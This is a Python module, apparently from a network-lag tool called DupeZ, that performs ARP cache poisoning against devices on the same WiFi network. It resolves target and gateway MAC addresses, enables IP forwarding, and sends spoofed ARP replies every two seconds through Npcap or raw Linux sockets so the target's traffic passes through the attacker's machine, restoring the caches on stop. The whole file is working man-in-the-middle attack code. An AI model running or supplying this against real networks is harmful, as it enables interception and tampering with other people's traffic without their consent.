#!/usr/bin/env python3
"""ARP spoofing for same-network WiFi interception.

When DupeZ targets a device on the **same WiFi network** (not a hotspot
subnet), traffic between that device and the internet never passes
through the laptop's network stack — so WinDivert sees nothing.

This module solves that by performing **ARP cache poisoning** (the same
technique NetCut and Ettercap use):

1.  Tell the **target device** that this laptop's MAC is the gateway.
2.  Tell the **gateway** that this laptop's MAC is the target device.
3.  Enable **Windows IP forwarding** so legitimate traffic still flows.

Once ARP spoofing is active, all traffic between the target and the
internet routes through this machine, where WinDivert's NETWORK_FORWARD
layer can intercept it.

Architecture
~~~~~~~~~~~~
::

    [Target]  ── spoofed ARP ──▶  thinks laptop = gateway
                                         │
    [Gateway] ── spoofed ARP ──▶  thinks laptop = target
                                         │
    [Laptop]  ── IP forwarding on ──▶  WinDivert NETWORK_FORWARD intercepts

Cleanup
~~~~~~~
On stop, the module **restores** the real MAC addresses in both the
target's and gateway's ARP caches by sending corrective ARP replies,
then disables IP forwarding (if it was off before).

Security note
~~~~~~~~~~~~~
This only works on the local L2 segment.  ARP spoofing requires raw
socket access (admin privileges), which DupeZ already requires for
WinDivert.
"""

from __future__ import annotations

import ctypes
import ipaddress
import platform
import re
import socket
import struct
import subprocess
import threading
import time
from typing import Optional, Tuple

from app.logs.logger import log_error, log_info
from app.utils.helpers import _NO_WINDOW

__all__ = [
    "ArpSpoofer",
    "get_default_gateway",
    "get_local_mac",
    "get_mac_for_ip",
    "is_same_network",
]


# ── Constants ────────────────────────────────────────────────────────

_ETH_P_ARP = 0x0806
_ARP_OP_REPLY = 2
_ARP_HW_ETHER = 1
_ETH_BROADCAST = b"\xff\xff\xff\xff\xff\xff"

# ARP spoof interval — how often we re-poison the caches.
# Needs to be frequent enough that the real gateway's own gratuitous
# ARPs don't undo our spoofing.
_SPOOF_INTERVAL_SEC = 2.0

# How many corrective ARP replies to send on cleanup.
_RESTORE_ROUNDS = 5
_RESTORE_INTERVAL_SEC = 0.3


# ── Helpers: gateway / MAC discovery ─────────────────────────────────

def get_default_gateway() -> Optional[str]:
    """Return the IPv4 default gateway address, or None.

    Uses ``ipconfig`` on Windows, ``ip route`` on Linux.
    """
    try:
        if platform.system().lower() == "windows":
            return _gateway_windows()
        return _gateway_linux()
    except Exception as e:
        log_error(f"get_default_gateway failed: {e}")
        return None


def _gateway_windows() -> Optional[str]:
    """Parse default gateway from ``ipconfig``."""
    try:
        out = subprocess.check_output(
            ["ipconfig"], text=True, timeout=5,
            creationflags=_NO_WINDOW,
        )
        # Match "Default Gateway . . . : 192.168.1.1" or similar
        for m in re.finditer(
            r"Default Gateway[\s.]*:\s*(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})",
            out,
        ):
            gw = m.group(1)
            if gw != "0.0.0.0":
                return gw
    except Exception as e:
        log_error(f"ipconfig gateway parse failed: {e}")

    # Fallback: route print
    try:
        out = subprocess.check_output(
            ["route", "print", "0.0.0.0"],
            text=True, timeout=5,
            creationflags=_NO_WINDOW,
        )
        for line in out.splitlines():
            parts = line.split()
            if len(parts) >= 3 and parts[0] == "0.0.0.0":
                gw = parts[2]
                try:
                    ipaddress.IPv4Address(gw)
                    if gw != "0.0.0.0":
                        return gw
                except ValueError:
                    continue
    except Exception as e:
        log_error(f"route print gateway parse failed: {e}")

    return None


def _gateway_linux() -> Optional[str]:
    """Parse default gateway from ``ip route``."""
    try:
        out = subprocess.check_output(
            ["ip", "route", "show", "default"],
            text=True, timeout=5,
        )
        # "default via 192.168.1.1 dev wlan0 ..."
        parts = out.split()
        if len(parts) >= 3 and parts[0] == "default" and parts[1] == "via":
            return parts[2]
    except Exception as e:
        log_error(f"ip route gateway parse failed: {e}")
    return None


def get_local_mac(target_ip: Optional[str] = None) -> Optional[str]:
    """Return the local interface MAC as a bytes(6) object.

    If *target_ip* is given, resolves the interface that would route to
    it (useful on multi-homed machines).  Otherwise uses the default
    route interface.
    """
    try:
        if platform.system().lower() == "windows":
            return _local_mac_windows(target_ip)
        return _local_mac_linux(target_ip)
    except Exception as e:
        log_error(f"get_local_mac failed: {e}")
        return None


def _local_mac_windows(target_ip: Optional[str] = None) -> Optional[bytes]:
    """Get local MAC via ``ipconfig /all``."""
    try:
        # Determine which local IP routes to the target
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect((target_ip or "8.8.8.8", 80))
            local_ip = s.getsockname()[0]

        out = subprocess.check_output(
            ["ipconfig", "/all"], text=True, timeout=5,
            creationflags=_NO_WINDOW,
        )
        # Walk sections: find the adapter whose IPv4 matches local_ip
        current_mac = None
        for line in out.splitlines():
            mac_m = re.match(
                r"\s*Physical Address[\s.]*:\s*([\dA-Fa-f-]{17})", line
            )
            if mac_m:
                current_mac = mac_m.group(1).replace("-", ":").lower()
            ip_m = re.search(
                r"IPv4 Address[\s.]*:\s*(\d+\.\d+\.\d+\.\d+)", line
            )
            if ip_m and ip_m.group(1) == local_ip and current_mac:
                return _mac_str_to_bytes(current_mac)

    except Exception as e:
        log_error(f"_local_mac_windows failed: {e}")
    return None


def _local_mac_linux(target_ip: Optional[str] = None) -> Optional[bytes]:
    """Get local MAC from /sys/class/net/<iface>/address."""
    import os
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect((target_ip or "8.8.8.8", 80))
            local_ip = s.getsockname()[0]

        # Find the interface for this IP
        out = subprocess.check_output(
            ["ip", "-o", "addr", "show"], text=True, timeout=5
        )
        iface = None
        for line in out.splitlines():
            if local_ip in line:
                iface = line.split()[1]
                break

        if iface:
            mac_path = f"/sys/class/net/{iface}/address"
            if os.path.exists(mac_path):
                with open(mac_path) as f:
                    return _mac_str_to_bytes(f.read().strip())
    except Exception as e:
        log_error(f"_local_mac_linux failed: {e}")
    return None


def get_mac_for_ip(ip: str) -> Optional[bytes]:
    """Resolve the MAC address of *ip* via the OS ARP cache.

    Pings the host first to ensure an ARP entry exists, then reads
    ``arp -a`` (Windows) or ``/proc/net/arp`` (Linux).

    Returns 6-byte MAC or None.
    """
    try:
        # Ping to populate ARP table
        _ping_once(ip)
        time.sleep(0.15)

        if platform.system().lower() == "windows":
            return _mac_from_arp_windows(ip)
        return _mac_from_arp_linux(ip)
    except Exception as e:
        log_error(f"get_mac_for_ip({ip}) failed: {e}")
        return None


def _ping_once(ip: str) -> None:
    """Send a single ICMP echo to populate the ARP table."""
    try:
        is_win = platform.system().lower() == "windows"
        count_flag = "-n" if is_win else "-c"
        # Windows -w is in ms; Linux -W is in seconds
        timeout_flag = "-w" if is_win else "-W"
        timeout_val = "500" if is_win else "1"
        subprocess.run(
            ["ping", count_flag, "1", timeout_flag, timeout_val, ip],
            capture_output=True, timeout=3,
            creationflags=_NO_WINDOW if is_win else 0,
        )
    except Exception:
        pass


def _mac_from_arp_windows(ip: str) -> Optional[bytes]:
    """Read MAC from ``arp -a`` output on Windows."""
    try:
        out = subprocess.check_output(
            ["arp", "-a", ip], text=True, timeout=5,
            creationflags=_NO_WINDOW,
        )
        for line in out.splitlines():
            if ip in line:
                m = re.search(r"([\da-fA-F]{2}[:-]){5}[\da-fA-F]{2}", line)
                if m:
                    mac_str = m.group(0).replace("-", ":").lower()
                    if mac_str != "ff:ff:ff:ff:ff:ff":
                        return _mac_str_to_bytes(mac_str)
    except Exception as e:
        log_error(f"_mac_from_arp_windows({ip}): {e}")
    return None


def _mac_from_arp_linux(ip: str) -> Optional[bytes]:
    """Read MAC from /proc/net/arp on Linux."""
    try:
        with open("/proc/net/arp") as f:
            for line in f:
                parts = line.split()
                if len(parts) >= 4 and parts[0] == ip:
                    mac = parts[3]
                    if mac not in ("00:00:00:00:00:00", "<incomplete>"):
                        return _mac_str_to_bytes(mac)
    except Exception as e:
        log_error(f"_mac_from_arp_linux({ip}): {e}")
    return None


def _mac_str_to_bytes(mac_str: str) -> bytes:
    """Convert 'aa:bb:cc:dd:ee:ff' to bytes(6).

    Raises ValueError if *mac_str* is not a valid 6-octet MAC address.
    """
    octets = mac_str.replace("-", ":").split(":")
    if len(octets) != 6:
        raise ValueError(f"invalid MAC address (expected 6 octets): {mac_str!r}")
    try:
        raw = bytes(int(o, 16) for o in octets)
    except ValueError as exc:
        raise ValueError(f"non-hex octet in MAC address {mac_str!r}: {exc}") from exc
    return raw


def _mac_bytes_to_str(mac_bytes: bytes) -> str:
    """Convert bytes(6) to 'aa:bb:cc:dd:ee:ff'."""
    return ":".join(f"{b:02x}" for b in mac_bytes)


# ── Network topology helpers ─────────────────────────────────────────

def is_same_network(ip_a: str, ip_b: str, prefix_len: int = 24) -> bool:
    """Check if two IPs are on the same /prefix_len network."""
    try:
        a = int(ipaddress.IPv4Address(ip_a))
        b = int(ipaddress.IPv4Address(ip_b))
        mask = (0xFFFFFFFF << (32 - prefix_len)) & 0xFFFFFFFF
        return (a & mask) == (b & mask)
    except (ipaddress.AddressValueError, ValueError):
        return False


def detect_wifi_same_network(target_ip: str) -> bool:
    """Return True if *target_ip* is on the same LAN as us but NOT a
    hotspot subnet (192.168.137.x).

    This is the condition where ARP spoofing is required: the target
    is reachable on L2 but traffic doesn't route through us.

    Delegates to :func:`target_profile._is_wifi_same_network` to
    avoid duplicating the detection logic.
    """
    try:
        from app.firewall.target_profile import _is_wifi_same_network
        return _is_wifi_same_network(target_ip)
    except ImportError:
        # Fallback: inline check if target_profile not available
        try:
            addr = ipaddress.IPv4Address(target_ip)
        except (ipaddress.AddressValueError, ValueError):
            return False

        if addr.is_loopback or addr.is_link_local:
            return False

        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.connect((target_ip, 80))
                local_ip = s.getsockname()[0]
        except Exception:
            return False

        return is_same_network(local_ip, target_ip)


# ── ARP packet construction ─────────────────────────────────────────

def _build_arp_reply(
    src_mac: bytes,
    src_ip: str,
    dst_mac: bytes,
    dst_ip: str,
) -> bytes:
    """Build a raw Ethernet frame containing an ARP reply.

    The ARP reply tells *dst_ip* (at *dst_mac*) that *src_ip* has
    MAC address *src_mac*.  When *src_mac* is our laptop's MAC and
    *src_ip* is the gateway, this poisons the target's ARP cache.

    Frame layout:
        Ethernet header (14 bytes):
            dst_mac(6) + src_mac(6) + ethertype(2)
        ARP payload (28 bytes):
            hw_type(2) + proto_type(2) + hw_len(1) + proto_len(1) +
            opcode(2) + sender_mac(6) + sender_ip(4) + target_mac(6) +
            target_ip(4)
    """
    # Ethernet header
    eth = dst_mac + src_mac + struct.pack("!H", _ETH_P_ARP)

    # ARP reply
    arp = struct.pack("!HHBBH",
                      _ARP_HW_ETHER,     # hardware type: Ethernet
                      0x0800,             # protocol type: IPv4
                      6,                  # hardware address length
                      4,                  # protocol address length
                      _ARP_OP_REPLY)      # opcode: reply

    arp += src_mac                           # sender hardware address
    arp += socket.inet_aton(src_ip)          # sender protocol address
    arp += dst_mac                           # target hardware address
    arp += socket.inet_aton(dst_ip)          # target protocol address

    return eth + arp


# ── Windows IP forwarding ────────────────────────────────────────────

def _get_ip_forwarding_state() -> bool:
    """Check if Windows IP forwarding is enabled."""
    if platform.system().lower() != "windows":
        try:
            with open("/proc/sys/net/ipv4/ip_forward") as f:
                return f.read().strip() == "1"
        except Exception:
            return False

    try:
        out = subprocess.check_output(
            ["netsh", "interface", "ipv4", "show", "global"],
            text=True, timeout=5,
            creationflags=_NO_WINDOW,
        )
        # Look for "IP Forwarding" line
        for line in out.splitlines():
            if "forwarding" in line.lower():
                return "enabled" in line.lower()
    except Exception as e:
        log_error(f"Failed to check IP forwarding state: {e}")
    return False


def _set_ip_forwarding(enable: bool) -> bool:
    """Enable or disable IP forwarding.

    On Windows uses ``netsh`` (requires admin).
    On Linux writes to ``/proc/sys/net/ipv4/ip_forward``.
    """
    if platform.system().lower() != "windows":
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1" if enable else "0")
            return True
        except Exception as e:
            log_error(f"Failed to set IP forwarding (Linux): {e}")
            return False

    state = "enabled" if enable else "disabled"
    try:
        subprocess.check_call(
            ["netsh", "interface", "ipv4", "set", "global",
             f"forwarding={state}"],
            timeout=10,
            creationflags=_NO_WINDOW,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        log_info(f"IP forwarding {state}")
        return True
    except subprocess.CalledProcessError as e:
        log_error(f"netsh set forwarding failed (exit {e.returncode})")
        return False
    except Exception as e:
        log_error(f"Failed to set IP forwarding: {e}")
        return False


# ── Raw socket sender (Windows) ──────────────────────────────────────

def _get_raw_socket() -> Optional[socket.socket]:
    """Open a raw Ethernet socket for sending ARP frames.

    On Windows, we use Npcap/WinPcap via ctypes. On Linux, AF_PACKET.

    Returns a socket-like object or None on failure.
    """
    if platform.system().lower() != "windows":
        try:
            # Linux: AF_PACKET raw socket
            s = socket.socket(
                socket.AF_PACKET, socket.SOCK_RAW, socket.htons(_ETH_P_ARP)
            )
            return s
        except Exception as e:
            log_error(f"AF_PACKET socket failed: {e}")
            return None

    # Windows doesn't support AF_PACKET — we need Npcap.
    # Return None here; the ArpSpoofer class uses NpcapSender instead.
    return None


class NpcapSender:
    """Thin wrapper around Npcap (WinPcap) for sending raw Ethernet frames.

    Npcap is already installed on most Windows machines that run Wireshark
    or WinDivert (the WinDivert installer doesn't bundle Npcap, but Npcap
    is the standard Windows raw-packet library).

    API used:
        pcap_open_live(device, snaplen, promisc, to_ms, errbuf) → pcap_t*
        pcap_sendpacket(pcap_t*, data, len) → int
        pcap_close(pcap_t*) → void
        pcap_findalldevs(alldevsp, errbuf) → int
        pcap_freealldevs(alldevs) → void
    """

    def __init__(self) -> None:
        self._pcap: Optional[ctypes.CDLL] = None
        self._handle: Optional[ctypes.c_void_p] = None
        self._loaded = False

    def load(self) -> bool:
        """Load the Npcap/WinPcap DLL."""
        if self._loaded:
            return True

        # Try Npcap first (installed in System32\Npcap), then legacy WinPcap
        for path in (
            r"C:\Windows\System32\Npcap\wpcap.dll",
            r"C:\Windows\System32\wpcap.dll",
        ):
            try:
                self._pcap = ctypes.CDLL(path)
                self._loaded = True
                log_info(f"Npcap/WinPcap loaded from {path}")
                return True
            except OSError:
                continue

        log_error(
            "Npcap/WinPcap not found. Install Npcap (https://npcap.com) "
            "to enable WiFi same-network interception."
        )
        return False

    def open(self, target_ip: str) -> bool:
        """Open a capture handle on the interface that routes to *target_ip*."""
        if not self._loaded:
            if not self.load():
                return False

        iface_name = self._find_interface(target_ip)
        if not iface_name:
            log_error(
                f"Could not find Npcap interface routing to {target_ip}. "
                f"Ensure the target is reachable and Npcap is installed."
            )
            return False

        errbuf = ctypes.create_string_buffer(256)
        self._handle = self._pcap.pcap_open_live(
            iface_name.encode("utf-8"),
            65535,  # snaplen
            1,      # promisc
            100,    # timeout ms
            errbuf,
        )
        if not self._handle:
            log_error(f"pcap_open_live failed: {errbuf.value.decode()}")
            return False

        log_info(f"Npcap handle opened on {iface_name}")
        return True

    def send(self, frame: bytes) -> bool:
        """Send a raw Ethernet frame."""
        if not self._handle:
            return False
        ret = self._pcap.pcap_sendpacket(
            self._handle, frame, len(frame)
        )
        return ret == 0

    def close(self) -> None:
        """Close the capture handle."""
        if self._handle and self._pcap:
            try:
                self._pcap.pcap_close(self._handle)
            except Exception:
                pass
            self._handle = None

    def _find_interface(self, target_ip: str) -> Optional[str]:
        """Find the Npcap device name for the interface routing to *target_ip*.

        Strategy: get local IP for target, enumerate Npcap devices,
        match by IP address.
        """
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.connect((target_ip, 80))
                local_ip = s.getsockname()[0]
        except Exception:
            return None

        if not self._pcap:
            return None

        # pcap_findalldevs
        class pcap_addr(ctypes.Structure):
            pass
        pcap_addr._fields_ = [
            ("next", ctypes.POINTER(pcap_addr)),
            ("addr", ctypes.c_void_p),
            ("netmask", ctypes.c_void_p),
            ("broadaddr", ctypes.c_void_p),
            ("dstaddr", ctypes.c_void_p),
        ]

        class pcap_if(ctypes.Structure):
            pass
        pcap_if._fields_ = [
            ("next", ctypes.POINTER(pcap_if)),
            ("name", ctypes.c_char_p),
            ("description", ctypes.c_char_p),
            ("addresses", ctypes.POINTER(pcap_addr)),
            ("flags", ctypes.c_uint),
        ]

        alldevsp = ctypes.POINTER(pcap_if)()
        errbuf = ctypes.create_string_buffer(256)

        if self._pcap.pcap_findalldevs(ctypes.byref(alldevsp), errbuf) != 0:
            log_error(f"pcap_findalldevs failed: {errbuf.value.decode()}")
            return None

        # Walk the device list and match by IP
        result = None
        dev = alldevsp
        while dev:
            dev_name = dev.contents.name.decode("utf-8", errors="replace")
            addr = dev.contents.addresses
            while addr:
                try:
                    sa = addr.contents.addr
                    if sa:
                        # sockaddr_in: family(2) + port(2) + ip(4)
                        family = ctypes.cast(
                            sa, ctypes.POINTER(ctypes.c_ushort)
                        ).contents.value
                        if family == socket.AF_INET:
                            ip_bytes = (ctypes.c_ubyte * 4).from_address(
                                sa + 4
                            )
                            ip_str = ".".join(str(b) for b in ip_bytes)
                            if ip_str == local_ip:
                                result = dev_name
                                break
                except Exception:
                    pass
                try:
                    addr = addr.contents.next
                except Exception:
                    break
            if result:
                break
            try:
                dev = dev.contents.next
            except Exception:
                break

        self._pcap.pcap_freealldevs(alldevsp)
        return result


# ── ArpSpoofer class ─────────────────────────────────────────────────

class ArpSpoofer:
    """Performs ARP cache poisoning to redirect traffic through this machine.

    Usage::

        spoofer = ArpSpoofer(target_ip="192.168.1.50")
        if spoofer.start():
            # Traffic now routes through us — WinDivert FORWARD will see it
            ...
            spoofer.stop()   # Restore real ARP entries + disable forwarding

    Thread-safety: start/stop are not concurrent-safe; call from one
    thread.  The internal poison loop runs on its own daemon thread.
    """

    def __init__(self, target_ip: str, gateway_ip: Optional[str] = None) -> None:
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip or get_default_gateway()

        self._target_mac: Optional[bytes] = None
        self._gateway_mac: Optional[bytes] = None
        self._local_mac: Optional[bytes] = None

        self._sender: Optional[NpcapSender] = None
        self._linux_sock: Optional[socket.socket] = None

        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._forwarding_was_enabled: bool = False

        # Stats (counter accessed from poison thread and main thread)
        self._packets_sent: int = 0
        self._stats_lock = threading.Lock()

    # ── Public API ───────────────────────────────────────────────

    def start(self) -> bool:
        """Begin ARP spoofing.

        Steps:
          1. Resolve MACs for target, gateway, and local interface.
          2. Enable IP forwarding (save prior state for restore).
          3. Open raw socket / Npcap handle.
          4. Start the poison loop thread.

        Returns True on success.
        """
        if self._running:
            log_info("ArpSpoofer already running")
            return True

        if not self.gateway_ip:
            log_error("ArpSpoofer: cannot determine default gateway")
            return False

        log_info(f"ArpSpoofer: target={self.target_ip}, "
                 f"gateway={self.gateway_ip}")

        # 1. Resolve MACs
        self._local_mac = get_local_mac(self.target_ip)
        if not self._local_mac:
            log_error("ArpSpoofer: cannot determine local MAC address")
            return False
        log_info(f"ArpSpoofer: local MAC = "
                 f"{_mac_bytes_to_str(self._local_mac)}")

        self._target_mac = get_mac_for_ip(self.target_ip)
        if not self._target_mac:
            log_error(f"ArpSpoofer: cannot resolve MAC for target "
                      f"{self.target_ip} — is the device reachable?")
            return False
        log_info(f"ArpSpoofer: target MAC = "
                 f"{_mac_bytes_to_str(self._target_mac)}")

        self._gateway_mac = get_mac_for_ip(self.gateway_ip)
        if not self._gateway_mac:
            log_error(f"ArpSpoofer: cannot resolve MAC for gateway "
                      f"{self.gateway_ip}")
            return False
        log_info(f"ArpSpoofer: gateway MAC = "
                 f"{_mac_bytes_to_str(self._gateway_mac)}")

        # 2. Enable IP forwarding
        self._forwarding_was_enabled = _get_ip_forwarding_state()
        if not self._forwarding_was_enabled:
            if not _set_ip_forwarding(True):
                log_error("ArpSpoofer: failed to enable IP forwarding")
                return False

        # 3. Open sender
        if platform.system().lower() == "windows":
            self._sender = NpcapSender()
            if not self._sender.load():
                self._restore_forwarding()
                return False
            if not self._sender.open(self.target_ip):
                self._restore_forwarding()
                return False
        else:
            self._linux_sock = _get_raw_socket()
            if not self._linux_sock:
                self._restore_forwarding()
                return False
            # Bind to the correct interface
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    s.connect((self.target_ip, 80))
                    local_ip = s.getsockname()[0]
                import subprocess as sp
                out = sp.check_output(
                    ["ip", "-o", "addr", "show"], text=True, timeout=5
                )
                iface = None
                for line in out.splitlines():
                    if local_ip in line:
                        iface = line.split()[1]
                        break
                if iface:
                    self._linux_sock.bind((iface, _ETH_P_ARP))
            except Exception as e:
                log_error(f"Linux ARP socket bind failed: {e}")

        # 4. Send initial poison burst and start loop
        self._running = True
        self._poison_once()

        self._thread = threading.Thread(
            target=self._poison_loop,
            daemon=True,
            name="ArpSpoofer",
        )
        self._thread.start()

        log_info("ArpSpoofer: ACTIVE — traffic is being redirected")
        return True

    def stop(self) -> None:
        """Stop ARP spoofing and restore real ARP entries."""
        if not self._running:
            return

        log_info("ArpSpoofer: stopping — restoring ARP caches...")
        self._running = False

        # Wait for poison thread to exit
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=3.0)

        # Restore real MACs
        self._restore_arp()

        # Close sender
        if self._sender:
            self._sender.close()
            self._sender = None
        if self._linux_sock:
            try:
                self._linux_sock.close()
            except Exception:
                pass
            self._linux_sock = None

        # Restore IP forwarding state
        self._restore_forwarding()

        log_info(f"ArpSpoofer: stopped (sent {self._packets_sent} ARP packets)")

    @property
    def is_active(self) -> bool:
        return self._running

    # ── Internal ─────────────────────────────────────────────────

    @property
    def packets_sent(self) -> int:
        """Thread-safe read of total ARP packets sent."""
        with self._stats_lock:
            return self._packets_sent

    def _send_frame(self, frame: bytes) -> bool:
        """Send a raw Ethernet frame through the appropriate sender."""
        if self._sender:
            ok = self._sender.send(frame)
        elif self._linux_sock:
            try:
                self._linux_sock.send(frame)
                ok = True
            except Exception:
                ok = False
        else:
            return False

        if ok:
            with self._stats_lock:
                self._packets_sent += 1
        return ok

    def _poison_once(self) -> None:
        """Send one round of spoofed ARP replies to both target and gateway."""
        if not (self._local_mac and self._target_mac and self._gateway_mac):
            return

        # Tell target: "gateway_ip is at our_mac"
        frame_to_target = _build_arp_reply(
            src_mac=self._local_mac,
            src_ip=self.gateway_ip,
            dst_mac=self._target_mac,
            dst_ip=self.target_ip,
        )
        self._send_frame(frame_to_target)

        # Tell gateway: "target_ip is at our_mac"
        frame_to_gateway = _build_arp_reply(
            src_mac=self._local_mac,
            src_ip=self.target_ip,
            dst_mac=self._gateway_mac,
            dst_ip=self.gateway_ip,
        )
        self._send_frame(frame_to_gateway)

    def _poison_loop(self) -> None:
        """Background thread: re-poison ARP caches every N seconds."""
        while self._running:
            try:
                self._poison_once()
            except Exception as e:
                log_error(f"ArpSpoofer poison loop error: {e}")
            # Sleep in small increments so we can exit quickly
            for _ in range(int(_SPOOF_INTERVAL_SEC / 0.25)):
                if not self._running:
                    return
                time.sleep(0.25)

    def _restore_arp(self) -> None:
        """Send corrective ARP replies to restore real MAC addresses."""
        if not (self._target_mac and self._gateway_mac):
            return

        for _ in range(_RESTORE_ROUNDS):
            try:
                # Tell target: "gateway_ip is at gateway_mac" (real)
                frame_to_target = _build_arp_reply(
                    src_mac=self._gateway_mac,
                    src_ip=self.gateway_ip,
                    dst_mac=self._target_mac,
                    dst_ip=self.target_ip,
                )
                self._send_frame(frame_to_target)

                # Tell gateway: "target_ip is at target_mac" (real)
                frame_to_gateway = _build_arp_reply(
                    src_mac=self._target_mac,
                    src_ip=self.target_ip,
                    dst_mac=self._gateway_mac,
                    dst_ip=self.gateway_ip,
                )
                self._send_frame(frame_to_gateway)
            except Exception as e:
                log_error(f"ArpSpoofer restore error: {e}")

            time.sleep(_RESTORE_INTERVAL_SEC)

        log_info("ArpSpoofer: ARP caches restored")

    def _restore_forwarding(self) -> None:
        """Restore IP forwarding to its prior state."""
        if not self._forwarding_was_enabled:
            _set_ip_forwarding(False)
            log_info("ArpSpoofer: IP forwarding restored to disabled")
